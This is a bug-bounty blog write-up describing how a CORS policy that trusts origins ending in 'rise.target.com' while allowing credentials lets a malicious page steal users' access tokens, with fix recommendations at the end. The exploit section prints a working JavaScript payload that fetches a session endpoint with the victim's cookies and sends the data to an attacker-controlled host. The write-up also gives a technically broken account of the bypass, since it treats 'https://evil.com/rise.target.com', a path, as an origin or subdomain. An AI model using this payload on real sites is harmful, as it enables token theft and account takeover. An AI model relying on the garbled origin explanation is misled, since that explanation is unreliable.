---
title: Auth Token Theft via CORS Misconfiguration
description: A critical CORS misconfiguration allowed stealing authentication tokens by abusing a wildcard-like origin match and `Access-Control-Allow-Credentials: true`.
date: 2025-03-08
tags:
  - cors
  - auth-token-theft
  - access-control
  - bug-bounty
  - web-security
---
# How a CORS Misconfiguration Could Have Let Me Steal Auth Tokens

In this post, I’ll walk you through a **CORS misconfiguration vulnerability** I discovered that allowed me to **steal authentication tokens**, **impersonate users**, and access sensitive data — all with a few lines of JavaScript. This bug stemmed from a subtle but dangerous CORS policy misconfiguration.

---

## 🧠 Background: What Is CORS?

**CORS (Cross-Origin Resource Sharing)** is a browser security feature that restricts how websites from one origin can interact with resources from another. If not configured properly, it can unintentionally expose APIs to malicious sites.

---

## 🚩 The Vulnerability

The API I tested had the following CORS behavior:

* It allowed any origin that **ended with** a trusted subdomain like `rise.target.com`
* It also responded with:

  ```
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://evil.com/rise.target.com
  ```

That meant **any malicious domain** that crafted a similar subdomain (e.g., `https://evil.com/rise.target.com`) could **bypass origin checks** and access sensitive API responses.

---

## 🔬 Testing the Exploit

I hosted a malicious site at:

```
https://evil.com/rise.target.com
```

Then, I injected this simple payload:

```javascript
fetch("https://id.target.com/v1/session/rise/switch/", {
  method: "GET",
  credentials: "include" // Sends victim's cookies
})
.then(res => res.json())
.then(data => {
  // Exfiltrate session data to my server
  fetch("https://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(data)));
});
```

When a logged-in victim visited my page, their browser:

* Automatically sent their session cookie (`HERMES_ID`)
* The API accepted my domain (since it *looked* trusted)
* The response included **valid tokens and user metadata**
* The data was silently exfiltrated to my server

---

## 📸 Evidence

Here’s a look at what I received:

* ✅ Valid `access_token`
* 🧑‍💼 User profile information
* 🔐 Authenticated session context

![POC](/assets/writeups/2.png)

---

## 🛡️ Fix Recommendations

To fix this kind of issue, here’s what I recommended:

### 1. **Strict CORS Origin Checks**

Only allow exact origins:

```http
Access-Control-Allow-Origin: https://rise.target.com
```

Avoid dangerous patterns like:

```js
if (origin.endsWith('rise.target.com')) // ❌
```

### 2. **Secure Cookies with SameSite**

Use this to block cross-origin cookies:

```http
Set-Cookie: HERMES_ID=abc; Secure; HttpOnly; SameSite=Strict
```

### 3. **Avoid Allowing Credentials Loosely**

Only use:

```http
Access-Control-Allow-Credentials: true
```

...if you’re absolutely sure the origin is trusted.

---

## 🎯 Impact

This misconfiguration could allow:

* Complete **account takeover**
* Unauthorized **GraphQL or API access**
* Exploitation from **any malicious website** with a spoofed subdomain

---

## 🔚 Final Thoughts

CORS misconfigurations are subtle and often overlooked — but their impact can be critical. This vulnerability didn’t need a single line of backend code to be touched by the attacker. Just a cookie, a misconfigured header, and a clever origin were enough.

If you're building or reviewing APIs, **always test your CORS logic** under real attack scenarios. What seems safe on paper might leak tokens in practice.

---

💬 Have you seen similar CORS issues in the wild? Let's connect on [Twitter](https://twitter.com/00xmora), or [LinkedIn](https://linkedin.com/in/00xmora).

---